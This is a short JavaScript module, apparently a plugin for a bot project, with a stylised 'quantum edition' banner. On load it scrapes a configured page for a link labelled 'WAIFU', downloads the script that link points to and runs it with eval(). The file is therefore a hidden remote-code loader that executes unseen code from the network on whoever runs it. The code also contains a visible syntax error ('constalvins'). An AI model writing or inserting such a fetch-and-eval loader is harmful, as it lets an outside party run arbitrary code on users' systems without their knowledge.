//  [ALVIN -DIGITAL QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Alvin Sirengo                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
constalvins = require(__dirname + "/../config");

async function fetchWAIFUUrl() {
  try {
    const response = await axios.get(alvins.ALVIN_DIiGITAL);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("WAIFU")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('WAIFU not found 😭');
    }

    console.log('WAIFU loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchWAIFUUrl();
